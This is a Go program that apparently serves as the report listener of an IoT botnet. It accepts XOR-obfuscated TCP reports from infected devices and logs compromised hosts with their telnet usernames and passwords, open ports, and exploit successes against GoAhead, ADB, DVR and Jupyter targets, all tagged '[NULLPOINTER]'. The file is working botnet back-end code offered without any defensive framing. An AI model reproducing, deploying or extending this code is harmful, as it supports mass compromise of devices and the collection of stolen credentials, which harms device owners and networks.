package main

import (
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"time"
)

type scanConfig struct {
	ScanListen string `json:"scan_listen"`
	ProtoKey   string `json:"proto_key"`
}

var protoKey []byte

func main() {
	cfgPath := "config.json"
	if _, err := os.Stat(cfgPath); os.IsNotExist(err) {
		cfgPath = filepath.Join(filepath.Dir(os.Args[0]), "config.json")
	}
	cfg := &scanConfig{ScanListen: "0.0.0.0:34130"}
	if data, err := os.ReadFile(cfgPath); err == nil {
		json.Unmarshal(data, cfg)
	}
	if cfg.ScanListen == "" {
		cfg.ScanListen = "0.0.0.0:34130"
	}
	if cfg.ProtoKey != "" {
		if key, err := hex.DecodeString(cfg.ProtoKey); err == nil && len(key) >= 32 {
			protoKey = key[:32]
		}
	}

	l, err := net.Listen("tcp", cfg.ScanListen)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[ scanListen ready ]", cfg.ScanListen)

	for {
		conn, err := l.Accept()
		if err != nil {
			break
		}
		go handleConnection(conn)
	}
}

func protoDecrypt(buf []byte) {
	if len(protoKey) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= protoKey[i%32]
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	lenBuf, err := readXBytes(conn, 2)
	if err != nil {
		return
	}
	payloadLen := int(binary.BigEndian.Uint16(lenBuf))
	if payloadLen <= 0 || payloadLen > 2048 {
		return
	}

	payload, err := readXBytes(conn, payloadLen)
	if err != nil {
		return
	}
	protoDecrypt(payload)

	if len(payload) < 1 {
		return
	}
	parseReport(payload)
}

func parseReport(buf []byte) {
	pos := 0
	next := func(n int) []byte {
		if pos+n > len(buf) {
			return nil
		}
		b := buf[pos : pos+n]
		pos += n
		return b
	}

	first := next(1)
	if first == nil {
		return
	}

	switch first[0] {
	case 3:
		parseExploit(buf, pos)
	case 2:
		parseScanports(buf, pos)
	default:
		parseTelnet(buf, first[0], pos)
	}
}

func parseExploit(buf []byte, pos int) {
	if pos+1+4+2+1 > len(buf) {
		return
	}
	exploitType := buf[pos]
	ipInt := binary.BigEndian.Uint32(buf[pos+1:])
	portInt := binary.BigEndian.Uint16(buf[pos+5:])
	pos += 7
	uLen := int(buf[pos])
	pos++
	if pos+uLen+1 > len(buf) {
		return
	}
	userBuf := buf[pos : pos+uLen]
	pos += uLen
	pLen := int(buf[pos])
	pos++
	if pos+pLen > len(buf) {
		return
	}
	passBuf := buf[pos : pos+pLen]

	exploitName := "unknown"
	switch exploitType {
	case 1:
		exploitName = "goahead"
	case 2:
		exploitName = "adb"
	case 3:
		exploitName = "dvr"
	case 4:
		exploitName = "jupyter"
	}
	userStr := string(userBuf)
	passStr := string(passBuf)
	fmt.Printf("[NULLPOINTER] EXPLOIT %s >> %d.%d.%d.%d:%d %s:%s\n",
		exploitName, (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, userStr, passStr)
	f, _ := os.OpenFile("sl_exploits.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if f != nil {
		fmt.Fprintf(f, "%s %d.%d.%d.%d:%d %s:%s\n",
			exploitName, (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, userStr, passStr)
		f.Close()
	}
}

func parseScanports(buf []byte, pos int) {
	if pos+4+1 > len(buf) {
		return
	}
	ipInt := binary.BigEndian.Uint32(buf[pos:])
	n := int(buf[pos+4])
	pos += 5
	if pos+n*2 > len(buf) {
		return
	}
	var portStr string
	for i := 0; i < n; i++ {
		p := binary.BigEndian.Uint16(buf[pos:])
		pos += 2
		if i > 0 {
			portStr += ","
		}
		portStr += fmt.Sprintf("%d", p)
	}
	fmt.Printf("[NULLPOINTER] SCAN >> %d.%d.%d.%d open: %s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portStr)
	f, _ := os.OpenFile("sl_scanports.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if f != nil {
		fmt.Fprintf(f, "%d.%d.%d.%d: %s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portStr)
		f.Close()
	}
}

func parseTelnet(buf []byte, firstByte byte, pos int) {
	var ipInt uint32
	var portInt uint16
	if firstByte == 0 {
		if pos+4+2 > len(buf) {
			return
		}
		ipInt = binary.BigEndian.Uint32(buf[pos:])
		portInt = binary.BigEndian.Uint16(buf[pos+4:])
		pos += 6
	} else {
		if pos+3 > len(buf) {
			return
		}
		ipBuf := []byte{firstByte, buf[pos], buf[pos+1], buf[pos+2]}
		ipInt = binary.BigEndian.Uint32(ipBuf)
		portInt = 23
		pos += 3
	}
	if pos+1+1 > len(buf) {
		return
	}
	uLen := int(buf[pos])
	pos++
	if pos+uLen+1 > len(buf) {
		return
	}
	usernameBuf := buf[pos : pos+uLen]
	pos += uLen
	pLen := int(buf[pos])
	pos++
	if pos+pLen > len(buf) {
		return
	}
	passwordBuf := buf[pos : pos+pLen]

	file, err := os.OpenFile("sl_fnbnet.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
		log.Fatal("Cannot create file", err)
	}
	defer file.Close()
	fmt.Printf("[NULLPOINTER] FOUND >> %d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
	fmt.Fprintf(file, "%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
	buf := make([]byte, amount)
	tl := 0
	for tl < amount {
		rd, err := conn.Read(buf[tl:])
		if err != nil || rd <= 0 {
			return nil, errors.New("Failed to read")
		}
		tl += rd
	}
	return buf, nil
}
